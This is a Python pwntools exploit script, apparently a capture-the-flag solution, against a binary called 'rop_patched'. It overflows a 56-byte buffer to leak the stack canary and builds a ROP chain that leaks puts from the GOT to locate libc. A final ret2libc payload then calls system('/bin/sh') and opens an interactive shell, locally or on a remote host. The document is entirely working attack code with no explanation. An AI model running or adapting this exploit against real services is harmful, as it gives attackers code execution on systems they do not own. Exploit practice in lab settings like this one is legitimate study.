from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './rop_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('./libc-2.27.so')
rop = ROP(elf)
payload = b'a' * 56
p.sendlineafter(b'Buf: ', payload)
p.recvuntil(b'Buf: ')
p.recv(56)
canary = u64(p.recv(8)) - 0xa
log.info('canary: ' + hex(canary))
payload2 = b'a' * 56 + p64(canary) + b'a' * 8 
payload2 += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload2 += p64(elf.got['puts'])
payload2 += p64(elf.plt['puts'])
payload2 += p64(elf.symbols['main'])
p.sendlineafter(b'Buf: ', payload2)
leak = u64(p.recv(6).ljust(8, b'\x00'))
info('leak: ' + hex(leak))
libc.address = leak - libc.symbols['puts']
info('libc: ' + hex(libc.address))
payload3 = b'a' * 56 + p64(canary) + b'a' * 8
payload3 += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload3 += p64(next(libc.search(b'/bin/sh\x00')))
payload3 += p64(rop.find_gadget(['ret']).address)
payload3 += p64(libc.symbols['system'])
p.sendlineafter(b'Buf: ', payload3)
p.sendlineafter(b'Buf: ', payload3)
p.interactive()


